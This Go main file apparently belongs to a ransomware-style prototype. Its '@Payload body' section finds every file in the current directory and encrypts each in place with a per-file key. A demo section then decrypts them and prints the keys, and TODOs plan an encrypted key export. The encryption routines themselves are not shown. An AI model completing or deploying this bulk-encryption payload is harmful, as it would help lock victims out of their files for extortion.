package main

import (
	"fmt"
)

/*
 * TODO, add layering to encrypt() WITH ephemeral subkeys
 * TODO, add KeyList.export(exportKey []GCMKey) []byte
 * 		-> Join each element with delimiter (perhaps strings.Join?), then encrypt and return
 */

func main() {

	// @Payload body -> Descover & Initialize file objects
	files := DiscoverFilesInDirectory(".")

	// @Payload body -> Encrypt files
	for _, f := range files.files {

		// key := keys.newKey()
		fmt.Printf("[!] Encrypting file [%s] with key %x...\n", string(f.name), f.key.key)
		f.encrypt()
	}

	// @Demo -> Decrypt files
	for _, f := range files.files {

		// key := keys.getKey(i)
		fmt.Printf("[!] Decrypting file [%s] with key %x...\n", string(f.name), f.key.key)
		f.decrypt()

	}

	// @Demo -> Print keys
	for _, f := range files.files {
		// key.print()
		f.key.print()
	}

	// @Demo -> Export keys
	// exportedKeys, exportKey := files.exportKeys()
	// fmt.Printf("Exported [%x] with key %x\n", exportedKeys, exportKey)

}
